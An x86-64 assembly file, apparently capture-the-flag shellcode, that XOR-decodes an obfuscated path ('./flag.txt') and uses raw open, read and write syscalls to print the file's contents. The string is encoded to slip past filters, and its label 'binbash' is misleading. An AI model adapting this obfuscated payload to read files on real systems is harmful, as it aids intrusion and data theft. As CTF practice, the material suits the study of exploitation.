.global _start
.intel_syntax noprefix

_start:
    lea rsi, [rip + binbash]
    lea rdi, [rsp + 0x100]
    mov rcx, 0




xor_loop:
    mov al, byte [rsi]
    xor al, 0x1b              
    mov byte [rdi], al
    inc rsi
    inc rdi
    inc rcx
    cmp rcx, 10
    jne xor_loop

    lea rbx , [rsp + 0x109]
    mov eax, 0
    mov byte [rbx], al
open:
    lea rdi, [rsp + 0x102]
    mov rsi, 0
    mov eax, 2
    syscall
read:
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, 0x1000
    mov eax, 0
    syscall
write:
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov eax, 1
    syscall
exit:
    mov eax, 60
    syscall
binbash:
    .string "54}wz|5oco"
